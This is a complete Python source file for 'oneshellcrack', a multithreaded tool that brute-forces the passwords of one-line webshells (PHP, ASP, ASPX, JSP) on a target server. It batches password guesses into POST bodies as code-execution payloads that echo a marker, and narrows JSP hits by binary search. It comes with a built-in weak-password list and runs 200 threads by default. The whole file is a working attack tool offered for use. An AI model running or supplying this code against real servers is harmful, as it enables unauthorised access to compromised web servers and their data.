#!/usr/bin/env python3
#-*-coding:UTF-8-*-

import re
import sys
import time
import signal
import requests
import argparse
from threading import Thread, BoundedSemaphore, Lock

__program__ = 'oneshellcrack'
__version__ = '1.0.0'
__author__ = 'L'
__github__ = 'https://github.com/L-codes/oneshellcrack'

headers = {'Content-Type': 'application/x-www-form-urlencoded',
           'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; en) Opera 9.26'}
attack = True
pwd = None
lock = Lock()

def interrupt_handler(signalnum, frame):
    raise SystemExit('\rEnd')


def binary_tree_crack(i, args, payload):
    print('[INFO] password in No.{}, BinaryTree attack...'.format(i))
    head = 'z0=UTF-8&z1={L-OneShellCrack}&'
    pwds = payload.split('&')[2:]
    while len(pwds) != 1:
        segmentation = len(pwds) // 2
        left_subtree, right_subtree, = pwds[:segmentation], pwds[segmentation:]
        r = requests.post(args.url, data=head+'&'.join(left_subtree), timeout=args.timeout, headers=headers)
        pwds = left_subtree if '{L-OneShellCrack}' in r.text else right_subtree
    return pwds[0][:-2]
        

def crack(i, args, payload):
    global semaphore
    try:
        global attack, pwd
        r = requests.post(args.url, data=payload, timeout=args.timeout, headers=headers)
        with lock:
            print('[Attack] No.{} ({:2.2f}s) CODE: {} - POST Content-Length: {}'.format(
                  i, r.elapsed.total_seconds(), r.status_code, len(payload)))
        if args.shell in ('php', 'asp', 'aspx'):
            match = re.search(r'L(?P<pwd>.*?)Codes', r.text)
            if match and attack:
                attack = False
                pwd = match.group('pwd').replace('=', '&')
                exit(1)
        elif '{L-OneShellCrack}' in r.text and attack:
            attack = False
            pwd = binary_tree_crack(i, args, payload)
            exit(1)
    except Exception as e:
        print('[Error] ' + str(e))
    finally:
        semaphore.release()
            


def chain_pwd_files(files):
    for file in files:
        try:
            open_args = dict()
            if sys.version_info.major == 3:
                open_args = {'errors': 'ignore'}
            with open(file, **open_args) as f:
                for line in f:
                    yield line.strip()
        except Exception as e:
            print(str(e))
            

def create_payload(args):
    max_request = args.max_request
    weak_passwords = '''chopper pwd cc pass test abc abc123 123456 123 12345 passwd passwords'''.split()
    context = 'L{1}Codes'
    shell_payload = {'php':  '{0}=echo \'' + context + '\';',
                     'asp':  '{0}=Response.Write("' + context + '")',
                     'aspx': '{0}=Response.Write("' + context + '")',
                     'jsp':  '{0}=L' }
    template = shell_payload[args.shell]
    pwds = chain_pwd_files(args.pwd_files) if args.pwd_files else weak_passwords

    if args.shell == 'php':
        legal_pwd = re.compile(r'[a-zA-Z0-9!#$()*,\-./:;<>?@\\\[\]^_`{|}~]+$')
    elif args.shell == 'jsp':
        legal_pwd = re.compile(r'[a-zA-Z0-9!#$()*,\-./:;<>?@\\\[\]^_`{|}~\'"]+$')
    elif args.shell in ('asp', 'aspx'):
        legal_pwd = re.compile(r'[a-zA-Z0-9!#$()*,\-./:;<>?@\\\[\]^_`{|}~&]+$')

    legal_pwd_match = legal_pwd.match

    jsp_head = 'z0=UTF-8&z1={L-OneShellCrack}&' if args.shell == 'jsp' else ''
    payload = set()
    counter = 0
    for pwd in pwds:
        if legal_pwd_match(pwd):
            counter += 1
            payload.add(template.format(pwd, pwd.replace('&', '=')))
            if len(payload) == max_request:
                yield jsp_head + '&'.join(payload)
                payload = set()
    if payload:
        yield jsp_head + '&'.join(payload)

    global pwd_total
    pwd_total = counter


def check(url):
    import socket
    try:
        domain = re.search(r'//(.*?)(:\d+)?/', url)
        host, port = domain.groups()
        port = int(port[1:]) if port else 80
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.settimeout(5)
        c.connect((host, port))
    except:
        raise SystemExit('[Error] Failed to connect to ' + url)
    finally:
        c.close()


def commandline():
    banner = '''\
  ___             ____  _          _ _  ____                _    
 / _ \ _ __   ___/ ___|| |__   ___| | |/ ___|_ __ __ _  ___| | __
| | | | '_ \ / _ \___ \| '_ \ / _ \ | | |   | '__/ _` |/ __| |/ /
| |_| | | | |  __/___) | | | |  __/ | | |___| | | (_| | (__|   < 
 \___/|_| |_|\___|____/|_| |_|\___|_|_|\____|_|  \__,_|\___|_|\_\\                                                           

               [ Author {}       Version {} ]

[ Github ] {}
'''.format(__author__, __version__, __github__)
    print(banner)
    parser = argparse.ArgumentParser(
       formatter_class=argparse.RawTextHelpFormatter,
       epilog='''\
use examples:
  python {0} http://orz/orz.php python {0} http://orz/orz.jsp -n 1000 -m 300
  python {0} http://orz/orz.asp -p pwd1.lst pwd2.lst'''.format(__program__ + '.py'))
    parser.add_argument('-m', '--max-threads', default=200, type=int, dest='max_threads', metavar='',
                        help='specify max threads [default: %(default)d]')
    parser.add_argument('-n', '--number', default=1000, type=int, dest='max_request', metavar='',
                        help='specify max password request [default: %(default)d]')
    parser.add_argument('-s', '--shell', dest='shell', metavar='',
                        choices=['php', 'asp', 'aspx', 'jsp'],
                        help='specify webshell type')
    parser.add_argument('-t', '--timeout', default=8, type=int, dest='timeout', metavar='',
                        help='specify request timeout [default: %(default)d]')
    parser.add_argument('-p', nargs='+', dest='pwd_files', metavar='FILE',
                        help='specify possword files [default: Weak passwords]')
    parser.add_argument('url', help='Target URL', metavar='URL')
    args = parser.parse_args()
    check(args.url)
    if not args.shell:
        shell = re.search(r'\.(php|asp|aspx|jsp)$', args.url)
        if shell:
            args.shell = shell.group(1)
        else:
            raise SystemExit('[INFO] Please use -s shell_type')
    return args


def main():
    global semaphore

    signal.signal(signal.SIGINT, interrupt_handler)
    args = commandline()
    semaphore = BoundedSemaphore(value=args.max_threads)
    stopwatch_start = time.time()
    for i, payload in enumerate(create_payload(args), 1):
        if attack:
            semaphore.acquire()
            t = Thread(target=crack, args=(i, args, payload))
            t.setDaemon(True)
            t.start()

    for _ in range(args.max_threads):
        semaphore.acquire()

    stopwatch = time.time() - stopwatch_start
    words = pwd_total
    try:
        speed = words / stopwatch
    except:
        speed = 0
    msg = '[Success] Password: {}'.format(pwd) if pwd else '[Failed] No password found'
    print('\n{msg}\n[Finish] {words} words in {stopwatch:.2f} seconds. ({speed:.2f} w/s)'.format(**locals()))
    

if __name__ == '__main__':
    main()
